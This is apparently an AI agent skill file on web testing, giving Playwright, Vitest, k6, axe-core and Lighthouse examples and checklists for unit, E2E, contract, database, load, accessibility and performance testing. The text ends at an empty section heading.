---
name: ck:web-testing
description: Web testing with Playwright, Vitest, k6. E2E/unit/integration/load/security/visual/a11y testing. Use for test automation, flakiness, Core Web Vitals, mobile gestures, cross-browser.
license: Apache-2.0
version: 3.0.0
argument-hint: "[test-type] [target]"
---

# Web Testing Skill

Comprehensive web testing: unit, integration, E2E, load, security, visual regression, accessibility.

## Quick Start

```bash
npx vitest run                    # Unit tests
npx playwright test               # E2E tests
npx playwright test --ui          # E2E with UI
k6 run load-test.js               # Load tests
npx @axe-core/cli https://example.com  # Accessibility
npx lighthouse https://example.com     # Performance
```

## Testing Strategy (Choose Your Model)

| Model | Structure | Best For |
|-------|-----------|----------|
| Pyramid | Unit 70% > Integration 20% > E2E 10% | Monoliths |
| Trophy | Integration-heavy | Modern SPAs |
| Honeycomb | Contract-centric | Microservices |

→ `./references/testing-pyramid-strategy.md`

## Reference Documentation

### Core Testing
- `./references/unit-integration-testing.md` - Vitest, browser mode, AAA
- `./references/e2e-testing-playwright.md` - Fixtures, sharding, selectors
- `./references/playwright-component-testing.md` - CT patterns (production-ready)
- `./references/component-testing.md` - React/Vue/Angular patterns

### Test Infrastructure
- `./references/test-data-management.md` - Factories, fixtures, seeding
- `./references/database-testing.md` - Testcontainers, transactions
- `./references/ci-cd-testing-workflows.md` - GitHub Actions, sharding
- `./references/contract-testing.md` - Pact, MSW patterns

### Cross-Browser & Mobile
- `./references/cross-browser-checklist.md` - Browser/device matrix
- `./references/mobile-gesture-testing.md` - Touch, swipe, orientation

### Performance & Quality
- `./references/performance-core-web-vitals.md` - LCP/CLS/INP, Lighthouse CI
- `./references/visual-regression.md` - Screenshot comparison
- `./references/test-flakiness-mitigation.md` - Stability strategies

### Accessibility & Security
- `./references/accessibility-testing.md` - WCAG, axe-core
- `./references/security-testing-overview.md` - OWASP Top 10
- `./references/security-checklists.md` - Auth, API, headers

### API & Load
- `./references/api-testing.md` - Supertest, GraphQL
- `./references/load-testing-k6.md` - k6 patterns

### Checklists
- `./references/pre-release-checklist.md` - Complete release checklist
- `./references/functional-testing-checklist.md` - Feature testing

## Scripts

### Initialize Playwright Project
```bash
node ./scripts/init-playwright.js [--ct] [--dir <path>]
```
Creates best-practice Playwright setup: config, fixtures, example tests.

### Analyze Test Results
```bash
node ./scripts/analyze-test-results.js \
  --playwright test-results/results.json \
  --vitest coverage/vitest.json \
  --output markdown
```
Parses Playwright/Vitest/JUnit results into unified summary.

## CI/CD Integration

```yaml
jobs:
  test:
    steps:
      - run: npm run test:unit      # Gate 1: Fast fail
      - run: npm run test:e2e       # Gate 2: After unit pass
      - run: npm run test:a11y      # Accessibility
      - run: npx lhci autorun       # Performance
```


---

## Reference Workflows

> The following sections are inlined from the skill's reference files for Cursor compatibility.

### accessibility testing

# Accessibility Testing (a11y)

## WCAG 2.1 AA Checklist

### Perceivable
- [ ] Images have meaningful alt text
- [ ] Color not sole conveyance method
- [ ] Contrast ratio 4.5:1 (text)
- [ ] Text resizable to 200%

### Operable
- [ ] All functions keyboard accessible
- [ ] Visible focus indicators
- [ ] Skip navigation links
- [ ] No keyboard traps

### Understandable
- [ ] Language attribute set
- [ ] Labels for form inputs
- [ ] Error messages clear

### Robust
- [ ] Valid HTML
- [ ] ARIA landmarks correct

## Playwright + axe-core

```typescript
import { test, expect } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';

test('page is accessible', async ({ page }) => {
  await page.goto('http://localhost:3000');
  const results = await new AxeBuilder({ page }).analyze();
  expect(results.violations).toEqual([]);
});

test('WCAG AA compliant', async ({ page }) => {
  await page.goto('http://localhost:3000');
  const results = await new AxeBuilder({ page })
    .withTags(['wcag2aa'])
    .analyze();
  expect(results.violations).toEqual([]);
});
```

## Component Testing (Jest)

```typescript
import { axe, toHaveNoViolations } from 'jest-axe';
expect.extend(toHaveNoViolations);

test('Button accessible', async () => {
  const { container } = render(<Button>Click</Button>);
  expect(await axe(container)).toHaveNoViolations();
});
```

## Manual Testing

- [ ] Tab through all interactive elements
- [ ] Shift+Tab navigates backward
- [ ] Enter/Space activates buttons
- [ ] Escape closes modals
- [ ] Screen reader announces content

## CLI Tools

```bash
npx @axe-core/cli https://example.com
npx lighthouse https://example.com --only-categories=accessibility
npx pa11y https://example.com
```

## CI Integration

```yaml
- name: Accessibility Tests
  run: npx playwright test --grep @a11y
```

## Resources
- axe rules: https://dequeuniversity.com/rules/axe/
- WCAG checklist: https://www.a11yproject.com/checklist/


### api testing

# API Testing

## Supertest (Jest/Vitest)

```javascript
import request from 'supertest';
import app from './app';

describe('POST /users', () => {
  it('creates user with valid data', async () => {
    const res = await request(app)
      .post('/users')
      .send({ email: 'test@example.com', password: 'secret123' });

    expect(res.status).toBe(201);
    expect(res.body.id).toBeDefined();
  });

  it('rejects duplicate email', async () => {
    await request(app).post('/users').send({ email: 'dup@example.com' });
    const res = await request(app).post('/users').send({ email: 'dup@example.com' });
    expect(res.status).toBe(409);
  });

  it('requires authentication', async () => {
    const res = await request(app).get('/protected');
    expect(res.status).toBe(401);
  });
});
```

## API Checklist

### Authentication
- [ ] Valid credentials return 200 + token
- [ ] Invalid credentials return 401
- [ ] Missing/expired token returns 401

### Authorization
- [ ] User accesses own resources
- [ ] Cannot access others' resources (403)

### Input Validation
- [ ] Missing required fields → 400
- [ ] Invalid types → 400
- [ ] SQL/XSS payloads rejected

### Response
- [ ] Correct status codes
- [ ] Schema matches docs
- [ ] Error messages helpful

### Rate Limiting
- [ ] Rate limit headers present
- [ ] 429 when limit exceeded

## Postman Tests

```javascript
pm.test("Status 200", () => pm.response.to.have.status(200));
pm.test("Has user ID", () => {
  pm.expect(pm.response.json().id).to.be.a('number');
});
```

## GraphQL Testing

```typescript
const query = `query { users { id email } }`;
const res = await request(app).post('/graphql').send({ query });
expect(res.body.data.users).toHaveLength(2);
```

## Contract Testing

```bash
npx dredd api.yaml http://localhost:3000
```


### ci cd testing workflows

# CI/CD Testing Workflows

## GitHub Actions - Complete Workflow

```yaml
name: Test Suite
on:
  push:
    branches: [main]
  pull_request:

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: 'npm' }
      - run: npm ci
      - run: npm run test:unit -- --coverage
      - uses: actions/upload-artifact@v4
        with: { name: coverage, path: coverage/ }

  e2e-tests:
    needs: unit-tests
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: 'npm' }
      - run: npm ci
      - run: npx playwright install --with-deps
      - run: npx playwright test --shard=${{ matrix.shard }}/4
      - uses: actions/upload-artifact@v4
        if: failure()
        with:
          name: playwright-report-${{ matrix.shard }}
          path: playwright-report/
```

## Test Splitting

```bash
# By shard (equal files)
npx playwright test --shard=1/4

# By timing (Knapsack)
- uses: chaosaffe/split-tests@v1
  with:
    glob: 'tests/**/*.spec.ts'
    split-total: ${{ matrix.shard }}
```

## Caching

```yaml
- uses: actions/cache@v4
  with:
    path: |
      ~/.npm
      ~/.cache/ms-playwright
    key: ${{ runner.os }}-${{ hashFiles('package-lock.json') }}
```

## Flaky Test Management

```yaml
- run: npx playwright test --retries=2
- run: npx playwright test --grep-invert @flaky  # Quarantine
```

## Performance & Security Gates

```yaml
- run: npm install -g @lhci/cli && lhci autorun
- run: npm audit --audit-level=high
- uses: github/codeql-action/analyze@v3
```

## Merge Reports

```yaml
merge-reports:
  needs: e2e-tests
  steps:
    - uses: actions/download-artifact@v4
      with: { pattern: playwright-report-*, merge-multiple: true }
    - run: npx playwright merge-reports ./all-reports
```

## GitLab CI

```yaml
stages: [test, e2e]

unit:
  stage: test
  script: [npm ci, npm run test:unit]

e2e:
  stage: e2e
  parallel: 4
  script:
    - npm ci && npx playwright install --with-deps
    - npx playwright test --shard=$CI_NODE_INDEX/$CI_NODE_TOTAL
  artifacts:
    when: on_failure
    paths: [playwright-report/]
```

## Best Practices

- **Fail fast:** Unit tests before E2E
- **Parallelism:** Shard E2E across jobs
- **Cache:** npm, Playwright browsers
- **Artifacts on failure:** Reports for debugging
- **Security gates:** npm audit, SAST before merge


### component testing

# Component Testing

## Philosophy: Test Behavior, Not Implementation

```javascript
// BAD: Tests internals
expect(component.state.isOpen).toBe(true);

// GOOD: Tests user-visible behavior
await userEvent.click(getByRole('button', { name: 'Open' }));
expect(getByRole('dialog')).toBeVisible();
```

## React Testing Library

```javascript
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';

test('form submission', async () => {
  render(<LoginForm />);
  await userEvent.type(screen.getByLabelText('Email'), 'test@example.com');
  await userEvent.type(screen.getByLabelText('Password'), 'secret123');
  await userEvent.click(screen.getByRole('button', { name: /login/i }));
  expect(screen.getByText('Login successful')).toBeInTheDocument();
});
```

## Vue Test Utils

```javascript
import { mount } from '@vue/test-utils';

test('form submission', async () => {
  const wrapper = mount(LoginForm);
  await wrapper.find('input[type="email"]').setValue('test@example.com');
  await wrapper.find('button').trigger('click');
  expect(wrapper.text()).toContain('Login successful');
});
```

## Angular Testing Library

```typescript
import { render, screen } from '@testing-library/angular';
import userEvent from '@testing-library/user-event';

test('form submission', async () => {
  await render(LoginFormComponent);
  const user = userEvent.setup();
  await user.type(screen.getByLabelText('Email'), 'test@example.com');
  await user.click(screen.getByRole('button', { name: /login/i }));
  expect(screen.getByText('Login successful')).toBeInTheDocument();
});
```

## Query Priority (Accessibility-First)

1. `getByRole` - buttons, links, headings
2. `getByLabelText` - form fields
3. `getByPlaceholderText` - inputs
4. `getByText` - non-interactive elements
5. `getByTestId` - last resort

## Async Patterns

```javascript
await screen.findByText('Loaded');
await waitForElementToBeRemoved(() => screen.queryByText('Loading'));
await waitFor(() => expect(screen.getByText('Done')).toBeInTheDocument());
```

## Mocking

```javascript
vi.mock('./api', () => ({
  fetchUser: vi.fn().mockResolvedValue({ name: 'John' })
}));

render(
  <UserContext.Provider value={{ user: mockUser }}>
    <Profile />
  </UserContext.Provider>
);
```

## Vitest Browser Mode

```typescript
// vitest.config.ts - more accurate than jsdom
export default defineConfig({
  test: { browser: { enabled: true, name: 'chromium', provider: 'playwright' } },
});
```


### contract testing

# Contract Testing

## When to Use

- Microservices communicating via HTTP/REST
- Frontend consuming backend APIs
- Multiple teams working on separate services
- Preventing integration failures at runtime

## Pact (Consumer-Driven Contracts)

### Consumer Side

```typescript
import { Pact } from '@pact-foundation/pact';

const provider = new Pact({
  consumer: 'Frontend',
  provider: 'UserService',
});

describe('User API', () => {
  beforeAll(() => provider.setup());
  afterEach(() => provider.verify());
  afterAll(() => provider.finalize());

  it('gets user by id', async () => {
    await provider.addInteraction({
      state: 'user 123 exists',
      uponReceiving: 'request for user 123',
      withRequest: {
        method: 'GET',
        path: '/users/123',
      },
      willRespondWith: {
        status: 200,
        body: {
          id: '123',
          name: 'John Doe',
          email: 'john@example.com',
        },
      },
    });

    const user = await userClient.getUser('123');
    expect(user.name).toBe('John Doe');
  });
});
```

### Provider Side

```typescript
import { Verifier } from '@pact-foundation/pact';

describe('Pact Verification', () => {
  it('validates consumer expectations', async () => {
    await new Verifier({
      providerBaseUrl: 'http://localhost:3000',
      pactBrokerUrl: process.env.PACT_BROKER_URL,
      provider: 'UserService',
      providerVersion: process.env.GIT_SHA,
      stateHandlers: {
        'user 123 exists': async () => {
          await db.users.insert({ id: '123', name: 'John Doe' });
        },
      },
    }).verifyProvider();
  });
});
```

## MSW (Mock Service Worker)

### Setup

```typescript
import { setupServer } from 'msw/node';
import { http, HttpResponse } from 'msw';

const handlers = [
  http.get('/api/users/:id', ({ params }) => {
    return HttpResponse.json({
      id: params.id,
      name: 'John Doe',
    });
  }),
];

export const server = setupServer(...handlers);

// In test setup
beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());
```

### Per-Test Override

```typescript
it('handles server error', async () => {
  server.use(
    http.get('/api/users/:id', () => {
      return HttpResponse.json({ error: 'Not found' }, { status: 404 });
    })
  );

  await expect(userClient.getUser('123')).rejects.toThrow();
});
```

## Pact + MSW Combined

```typescript
// Use MSW to simulate provider during Pact consumer tests
const pactMswHandler = http.get('/api/users/:id', () => {
  return HttpResponse.json(expectedPactResponse);
});
```

## CI Integration

```yaml
# Consumer publishes contract
- run: npx pact-broker publish ./pacts
    --consumer-app-version=${{ github.sha }}
    --broker-base-url=${{ secrets.PACT_BROKER_URL }}

# Provider verifies
- run: npm run test:pact:verify
    --provider-app-version=${{ github.sha }}

# Can-I-Deploy check
- run: npx pact-broker can-i-deploy
    --pacticipant=Frontend
    --version=${{ github.sha }}
    --to-environment=production
```

## Best Practices

- **Consumer-first:** Consumers define expectations
- **Version contracts:** Tie to git SHA
- **Pact Broker:** Central contract management
- **can-i-deploy:** Gate deployments on contract verification
- **State handlers:** Prepare provider data for each scenario


### cross browser checklist

# Cross-Browser & Responsive Testing

## Browser Coverage

| Browser | Priority |
|---------|----------|
| Chrome | Mandatory |
| Safari | Mandatory (mobile) |
| Edge | Mandatory |
| Firefox | Recommended |

## Device Breakpoints

| Device | Viewport | Priority |
|--------|----------|----------|
| Mobile S | 320px | High |
| Mobile M | 375px | High |
| Tablet | 768px | High |
| Laptop | 1024px | High |
| Desktop | 1440px | High |

## Playwright Config

```typescript
import { devices } from '@playwright/test';

export default defineConfig({
  projects: [
    { name: 'chromium', use: { ...devices['Desktop Chrome'] } },
    { name: 'firefox', use: { ...devices['Desktop Firefox'] } },
    { name: 'webkit', use: { ...devices['Desktop Safari'] } },
    { name: 'mobile-chrome', use: { ...devices['Pixel 5'] } },
    { name: 'mobile-safari', use: { ...devices['iPhone 12'] } },
  ],
});
```

## Responsive Checklist

### Layout
- [ ] Content reflows at all breakpoints
- [ ] No horizontal scrolling on mobile
- [ ] Navigation transforms to mobile menu
- [ ] Touch targets 44px minimum

### Forms
- [ ] Input fields usable on mobile
- [ ] Touch keyboard doesn't obscure inputs
- [ ] Date pickers mobile-friendly

### Interactive
- [ ] Hover states have touch alternatives
- [ ] Modals size appropriate per device

## Browser-Specific Issues

- **Safari**: flexbox gap, date input, WebP
- **Firefox**: CSS grid subgrid, custom scrollbars
- **Edge**: Same as Chromium (verify anyway)

## Commands

```bash
npx playwright test --project=chromium
npx playwright test --project=mobile-chrome --project=mobile-safari
```

## Testing Services

- **BrowserStack**: Real device cloud
- **Sauce Labs**: Cross-browser cloud
- **Playwright**: Local emulation (free)


### database testing

# Database Testing

## Testcontainers (Real Database Instances)

### Setup

```bash
npm install -D @testcontainers/postgresql
# or
npm install -D @testcontainers/mongodb
```

### PostgreSQL Example

```typescript
import { PostgreSqlContainer } from '@testcontainers/postgresql';
import { Pool } from 'pg';

describe('User Repository', () => {
  let container: PostgreSqlContainer;
  let pool: Pool;

  beforeAll(async () => {
    container = await new PostgreSqlContainer()
      .withDatabase('testdb')
      .start();

    pool = new Pool({ connectionString: container.getConnectionUri() });
    await runMigrations(pool);
  }, 60000); // 60s timeout for container start

  afterAll(async () => {
    await pool.end();
    await container.stop();
  });

  afterEach(async () => {
    await pool.query('TRUNCATE users RESTART IDENTITY CASCADE');
  });

  it('creates user', async () => {
    const repo = new UserRepository(pool);
    const user = await repo.create({ email: 'test@example.com' });
    expect(user.id).toBeDefined();
  });
});
```

### MongoDB Example

```typescript
import { MongoDBContainer } from '@testcontainers/mongodb';
import mongoose from 'mongoose';

describe('User Repository', () => {
  let container: MongoDBContainer;

  beforeAll(async () => {
    container = await new MongoDBContainer().start();
    await mongoose.connect(container.getConnectionString(), {
      directConnection: true,
    });
  }, 60000);

  afterAll(async () => {
    await mongoose.disconnect();
    await container.stop();
  });

  afterEach(async () => {
    await mongoose.connection.dropDatabase();
  });
});
```

## Transaction Rollback Pattern

```typescript
describe('User Service', () => {
  let transaction: Transaction;

  beforeEach(async () => {
    transaction = await db.transaction();
  });

  afterEach(async () => {
    await transaction.rollback(); // Always rollback
  });

  it('creates user within transaction', async () => {
    const service = new UserService(transaction);
    await service.create({ email: 'test@example.com' });
    // Transaction rolls back - no cleanup needed
  });
});
```

## Playwright Database Fixture

```typescript
// fixtures/db.ts
import { test as base } from '@playwright/test';
import { PostgreSqlContainer } from '@testcontainers/postgresql';

export const test = base.extend<{ db: Pool }>({
  db: [async ({}, use, testInfo) => {
    const container = await new PostgreSqlContainer().start();
    const pool = new Pool({ connectionString: container.getConnectionUri() });

    // Seed per-worker data
    await seedData(pool, testInfo.workerIndex);

    await use(pool);

    await pool.end();
    await container.stop();
  }, { scope: 'worker' }]
});
```

## In-Memory Alternatives

```typescript
// SQLite in-memory (faster, less realistic)
const db = new Database(':memory:');

// PGlite (Postgres in browser/Node)
import { PGlite } from '@electric-sql/pglite';
const db = new PGlite();
```

## Best Practices

- **Real DB in CI:** Use Testcontainers for high fidelity
- **In-memory locally:** Faster iteration during development
- **Isolation:** Worker-scoped containers for parallel tests
- **Migrations:** Always run migrations before tests
- **Cleanup:** Truncate after each test, stop containers after all
- **Timeouts:** Increase timeout for container startup (60s)


### e2e testing playwright

# E2E Testing with Playwright

## Setup

```bash
npm init playwright@latest
npx playwright install
```

## Test Structure

```typescript
import { test, expect } from '@playwright/test';

test.describe('User Login', () => {
  test('should login successfully', async ({ page }) => {
    await page.goto('/login');
    await page.getByLabel('Email').fill('user@example.com');
    await page.getByLabel('Password').fill('password123');
    await page.getByRole('button', { name: 'Login' }).click();
    await expect(page).toHaveURL('/dashboard');
  });
});
```

## Selector Priority (Accessibility-First)

1. `getByRole('button', { name: 'Submit' })` - Most preferred
2. `getByLabel('Email')` - Form fields
3. `getByPlaceholderText('Search')` - Inputs
4. `getByText('Welcome')` - Static text
5. `getByTestId('submit-btn')` - Last resort

## Advanced Fixtures

### Worker-Scoped Authentication

```typescript
// fixtures/auth.ts
export const test = baseTest.extend<{ authPage: Page }>({
  authPage: [async ({ browser, request }, use, testInfo) => {
    // API login per worker
    const res = await request.post('/api/auth', {
      data: { email: 'test@example.com', password: 'pass' }
    });
    const { token } = await res.json();

    const context = await browser.newContext();
    await context.addCookies([
      { name: 'token', value: token, domain: 'localhost', path: '/' }
    ]);
    const page = await context.newPage();
    await use(page);
    await context.close();
  }, { scope: 'worker' }]
});
```

### Database Seeding Fixture

```typescript
// See ./database-testing.md for Testcontainers patterns
```

## Network Patterns

### Wait for API

```typescript
const responsePromise = page.waitForResponse('**/api/users');
await page.click('button:text("Load")');
await responsePromise;
```

### Mock API

```typescript
await page.route('**/api/users', route =>
  route.fulfill({ status: 200, body: JSON.stringify([]) })
);
```

## Configuration

```typescript
export default defineConfig({
  workers: process.env.CI ? 1 : undefined,
  fullyParallel: true,
  retries: process.env.CI ? 2 : 0,
  use: {
    screenshot: 'only-on-failure',
    trace: 'on-first-retry',
    video: 'retain-on-failure',
  },
});
```

## Sharding (CI)

```bash
npx playwright test --shard=1/4
npx playwright test --shard=2/4
```

## Commands

```bash
npx playwright test                    # Run all
npx playwright test --ui               # UI mode
npx playwright test --project=chromium # Specific browser
npx playwright codegen https://example.com  # Generate
npx playwright show-report             # View report
```

## Related

- `./playwright-component-testing.md` - CT patterns
- `./playwright-fixtures-advanced.md` - Complex fixtures
- `./database-testing.md` - DB fixtures


### functional testing checklist

# Functional Testing Checklist

## Core Features

- [ ] Primary user workflows execute end-to-end
- [ ] CRUD operations work (create, read, update, delete)
- [ ] Error states handled gracefully
- [ ] Validation rules enforced (email, phone, dates)
- [ ] Search/filter functions correctly
- [ ] Sorting works in both directions
- [ ] Pagination displays correct data

## User Workflows

- [ ] Signup flow completes successfully
- [ ] Login flow works with valid credentials
- [ ] Password reset flow sends email and resets
- [ ] Multi-step forms retain data between steps
- [ ] Data persists after page refresh/navigation
- [ ] Logout clears session completely
- [ ] Deep links work correctly

## Business Logic

- [ ] Calculations correct (totals, discounts, taxes)
- [ ] Rules enforced (age verification, region restrictions)
- [ ] Edge cases handled (zero, negative, max values)
- [ ] Date/time operations account for timezones
- [ ] Currency formatting correct
- [ ] Quantity limits enforced

## Form Validation

- [ ] Required fields show error when empty
- [ ] Email format validation works
- [ ] Password strength requirements shown
- [ ] Phone number format accepted
- [ ] Date picker prevents invalid dates
- [ ] File upload validates type/size
- [ ] Form submits only when valid

## Integration Points

- [ ] API calls succeed with correct parameters
- [ ] Database operations persist
- [ ] Third-party integrations work (payment, auth)
- [ ] Error responses handled gracefully
- [ ] Loading states displayed during async ops
- [ ] Timeout handling for slow responses
- [ ] Retry logic works on failures

## Error Handling

- [ ] Network errors show retry option
- [ ] Invalid input shows helpful message
- [ ] 401 errors trigger re-authentication
- [ ] 403 errors show access denied
- [ ] 404 errors show not found page
- [ ] 500 errors logged, user sees friendly message
- [ ] Validation errors highlight specific fields

## State Management

- [ ] URL reflects application state
- [ ] Browser back/forward works correctly
- [ ] Bookmarking preserves state
- [ ] Shared links open correct view
- [ ] State persists through refresh (when appropriate)

## Test Priority Matrix

| Priority | Category | Examples |
|----------|----------|----------|
| P0 (Critical) | Core flows | Signup, login, checkout, payment |
| P1 (High) | Major features | Search, CRUD, navigation |
| P2 (Medium) | Secondary features | Filters, sorting, pagination |
| P3 (Low) | Edge cases | Empty states, max limits |

## Test Data Checklist

- [ ] Happy path data
- [ ] Empty/null values
- [ ] Boundary values (min, max)
- [ ] Invalid data types
- [ ] Unicode/special characters
- [ ] Long strings
- [ ] Whitespace (leading, trailing)
- [ ] Duplicate data scenarios


### interactive testing patterns

# Interactive Testing Patterns

## Form Testing

```javascript
// Text input validation
test('validates email format', async ({ page }) => {
  await page.fill('[name="email"]', 'invalid');
  await page.click('button[type="submit"]');
  await expect(page.locator('.error')).toContainText('Invalid email');
});

// Select dropdowns
await page.selectOption('select#country', 'US');
await page.selectOption('select#country', { label: 'United States' });
await page.selectOption('select#tags', ['tag1', 'tag2']); // Multi-select

// Checkboxes & radios
await page.check('input[name="terms"]');
await expect(page.locator('input[name="terms"]')).toBeChecked();
await page.uncheck('input[name="newsletter"]');
await page.check('input[value="premium"]'); // Radio

// File uploads
await page.setInputFiles('input[type="file"]', 'path/to/file.pdf');
await page.setInputFiles('input[type="file"]', ['file1.pdf', 'file2.pdf']);

// Date picker
await page.fill('input[type="date"]', '2025-12-25');
await page.click('.date-picker-trigger');
await page.click('.calendar-day:text("25")');
```

## Keyboard Navigation

```javascript
test('keyboard accessibility', async ({ page }) => {
  await page.keyboard.press('Tab');
  await expect(page.locator(':focus')).toHaveAttribute('data-testid', 'first-btn');
  await page.keyboard.press('Enter'); // Activate
  await page.keyboard.press('Escape'); // Close modal
  await page.keyboard.press('Shift+Tab'); // Navigate backward
});
```

## Drag & Drop

```javascript
await page.dragAndDrop('#source', '#target');

// Manual control
const source = page.locator('#draggable');
await source.hover();
await page.mouse.down();
await page.locator('#dropzone').hover();
await page.mouse.up();
```

## Hover & Modals

```javascript
await button.hover();
await expect(page.locator('.tooltip')).toBeVisible();

// Modal workflow
await page.click('button:text("Open")');
await expect(page.locator('[role="dialog"]')).toBeVisible();
await page.click('[aria-label="Close"]');
await expect(page.locator('[role="dialog"]')).not.toBeVisible();
```

## Scroll & Wait Patterns

```javascript
await page.locator('#footer').scrollIntoViewIfNeeded();
await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight));

// Wait patterns
await page.waitForLoadState('networkidle');
await Promise.all([page.waitForResponse('**/api/data'), page.click('button.load')]);
```

## Disable Animations

```javascript
await page.addStyleTag({
  content: '* { animation-duration: 0s !important; transition-duration: 0s !important; }'
});
```


### load testing k6

# Load Testing with k6

## Installation

```bash
brew install k6          # macOS
winget install k6        # Windows
docker run -i grafana/k6 run - <script.js
```

## Basic Load Test

```javascript
import http from 'k6/http';
import { check, sleep } from 'k6';

export const options = {
  vus: 10,
  duration: '30s',
};

export default function () {
  const res = http.get('http://localhost:3000/api/users');
  check(res, {
    'status is 200': (r) => r.status === 200,
    'response < 500ms': (r) => r.timings.duration < 500,
  });
  sleep(1);
}
```

## Stress Test with Stages

```javascript
export const options = {
  stages: [
    { duration: '2m', target: 50 },
    { duration: '5m', target: 50 },
    { duration: '2m', target: 100 },
    { duration: '2m', target: 0 },
  ],
  thresholds: {
    http_req_duration: ['p(95)<500'],
    http_req_failed: ['rate<0.01'],
  },
};
```

## With Authentication

```javascript
export function setup() {
  const res = http.post(`${BASE_URL}/api/login`, {
    email: 'test@example.com', password: 'password',
  });
  return { token: res.json('token') };
}

export default function (data) {
  const params = { headers: { Authorization: `Bearer ${data.token}` } };
  http.get(`${BASE_URL}/api/protected`, params);
}
```

## Performance Thresholds

| Metric | Good | Warning |
|--------|------|---------|
| p50 latency | <200ms | <500ms |
| p95 latency | <500ms | <1s |
| Error rate | <0.1% | <1% |

## Commands

```bash
k6 run script.js
k6 run --out json=results.json script.js
k6 cloud script.js  # Grafana Cloud
```

## Artillery Alternative

```yaml
config:
  target: 'http://localhost:3000'
  phases: [{ duration: 60, arrivalRate: 10 }]
scenarios:
  - flow: [{ get: { url: '/api/users' } }]
```

```bash
npx artillery run artillery.yml
```


### mobile gesture testing

# Mobile Gesture Testing

## Touch Gestures

### Single-Finger

```javascript
await page.tap('button.submit');                    // Tap
await page.locator('button').click({ delay: 1000 }); // Long press

// Swipe simulation
await page.evaluate(() => {
  const el = document.querySelector('.carousel');
  el.dispatchEvent(new TouchEvent('touchstart', { touches: [{ clientX: 200, clientY: 100 }] }));
  el.dispatchEvent(new TouchEvent('touchend', { touches: [{ clientX: 50, clientY: 100 }] }));
});
```

### Multi-Finger (Pinch/Zoom)

```javascript
await page.evaluate(() => {
  const el = document.querySelector('[data-zoomable]');
  const touch1 = { identifier: 0, clientX: 100, clientY: 100 };
  const touch2 = { identifier: 1, clientX: 120, clientY: 100 };
  el.dispatchEvent(new TouchEvent('touchstart', { touches: [touch1, touch2] }));
  touch1.clientX = 50; touch2.clientX = 170; // Fingers apart = zoom in
  el.dispatchEvent(new TouchEvent('touchmove', { touches: [touch1, touch2] }));
});
```

## Orientation Testing

```javascript
const orientations = [
  { width: 390, height: 844 },  // Portrait
  { width: 844, height: 390 },  // Landscape
];

for (const size of orientations) {
  await page.setViewportSize(size);
  await expect(page).toHaveScreenshot(`mobile-${size.width}.png`);
}
```

## Device Emulation

```typescript
// playwright.config.ts
import { devices } from '@playwright/test';

export default defineConfig({
  projects: [
    { name: 'mobile-chrome', use: { ...devices['Pixel 5'] } },
    { name: 'mobile-safari', use: { ...devices['iPhone 12'] } },
  ],
});
```

## Touch Target Checklist

- [ ] Minimum 44x44px touch targets
- [ ] No overlapping touch areas
- [ ] Sufficient spacing between buttons
- [ ] Swipe gestures have clear affordances

## Real Device Gaps

Emulators miss: network throttling, touch latency, gesture recognition variations.

**Minimum real device testing:** iPhone (Safari iOS), Android flagship (Chrome)

## Device Farm Services

| Service | Devices |
|---------|---------|
| BrowserStack | 3000+ |
| Sauce Labs | 2000+ |
| AWS Device Farm | 200+ |

## Commands

```bash
npx playwright test --project=mobile-chrome --project=mobile-safari
```


### performance core web vitals

# Performance & Core Web Vitals Testing

## Core Web Vitals (2024 Targets)

| Metric | Target | Description |
|--------|--------|-------------|
| LCP | < 2.5s | Largest Contentful Paint |
| CLS | < 0.1 | Cumulative Layout Shift |
| INP | < 200ms | Interaction to Next Paint (replaced FID) |

## Lighthouse CI Setup

```json
// lighthouserc.json
{
  "ci": {
    "collect": {
      "url": ["http://localhost:3000", "http://localhost:3000/dashboard"],
      "numberOfRuns": 3
    },
    "assert": {
      "preset": "lighthouse:recommended",
      "assertions": {
        "categories:performance": ["error", { "minScore": 0.9 }],
        "largest-contentful-paint": ["warn", { "maxNumericValue": 2500 }],
        "cumulative-layout-shift": ["error", { "maxNumericValue": 0.1 }],
        "interactive": ["warn", { "maxNumericValue": 3800 }]
      }
    },
    "upload": {
      "target": "temporary-public-storage"
    }
  }
}
```

## GitHub Actions Integration

```yaml
performance:
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4
    - run: npm ci && npm run build
    - run: npm install -g @lhci/cli
    - run: lhci autorun
      env:
        LHCI_GITHUB_APP_TOKEN: ${{ secrets.LHCI_TOKEN }}
```

## Playwright Performance Test

```typescript
test('measure Core Web Vitals', async ({ page }) => {
  await page.goto('/');

  const metrics = await page.evaluate(() => {
    return new Promise((resolve) => {
      new PerformanceObserver((list) => {
        const entries = list.getEntries();
        const lcp = entries.find(e => e.entryType === 'largest-contentful-paint');
        resolve({ lcp: lcp?.startTime });
      }).observe({ type: 'largest-contentful-paint', buffered: true });
    });
  });

  expect(metrics.lcp).toBeLessThan(2500);
});
```

## INP Measurement

```typescript
test('interaction responsiveness', async ({ page }) => {
  await page.goto('/');

  const inp = await page.evaluate(() => {
    return new Promise((resolve) => {
      let maxINP = 0;
      new PerformanceObserver((list) => {
        for (const entry of list.getEntries()) {
          maxINP = Math.max(maxINP, entry.duration);
        }
        resolve(maxINP);
      }).observe({ type: 'event', buffered: true, durationThreshold: 16 });

      // Trigger interactions
      document.querySelector('button')?.click();
      setTimeout(() => resolve(maxINP), 1000);
    });
  });

  expect(inp).toBeLessThan(200);
});
```

## Quick Commands

```bash
npx lighthouse https://example.com --output=json
npx @lhci/cli autorun
npx bundlesize                    # Bundle size check
npx webpack-bundle-analyzer stats.json
```

## Optimization Checklist

### LCP
- [ ] Lazy load below-fold images
- [ ] Preload critical resources (`<link rel="preload">`)
- [ ] Use CDN for static assets
- [ ] Optimize server response time

### CLS
- [ ] Set explicit width/height on images
- [ ] Reserve space for dynamic content
- [ ] Use `font-display: swap` or `optional`
- [ ] Avoid inserting content above existing

### INP
- [ ] Break long JavaScript tasks (<50ms)
- [ ] Use `requestIdleCallback` for non-critical work
- [ ] Implement code splitting
- [ ] Debounce rapid user interactions


### playwright component testing

